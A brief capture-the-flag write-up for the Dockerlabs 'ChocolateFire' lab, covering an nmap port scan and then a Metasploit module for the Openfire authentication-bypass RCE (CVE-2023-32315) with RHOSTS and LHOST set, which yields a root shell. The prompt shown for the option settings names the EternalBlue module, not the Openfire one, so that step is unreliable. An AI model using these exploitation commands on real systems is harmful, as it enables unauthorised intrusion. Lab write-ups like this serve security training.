
 <span style="color: FireBrick;  font-weight: bold;">ChocolateFire- Dockerlabs</span>

- **OS:** Linux - **Difficulty:** Medium
- **IP:** `172.17.0.2` 
- **Target:** root


---

 <span style="color: IndianRed; font-weight: bold;">Phase 1: Reconnaissance & Enumeration</span>

**1.1 Port Scanning (Nmap)**

```
nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 172.17.0.2
```

We discovered that the host  <span style="color: IndianRed; font-weight: bold;">172.17.0.2</span> is active and has port 9090 (HTTP) open. 



Comprobamos que está corriendo por ese puerto y es Openfire v4.7.4

 <span style="color: IndianRed; font-weight: bold;">Phase 2: Exploitation</span>

We launch `msfconsole` and search Openfire 4.7 exploit module:

```
msf6 > use exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315
```

Configure the required options (<span style="color: IndianRed; font-weight: bold;">RHOSTS</span> for the target IP and verify <span style="color: IndianRed; font-weight: bold;">LHOST</span> matches our attacker machine IP):

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 172.17.0.2 
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.X
msf6 exploit(windows/smb/ms17_010_eternalblue) > run
```

The exploit runs successfully, granting us an active **shell** session with full root privileges:

```
whoami
root
cd /home
```






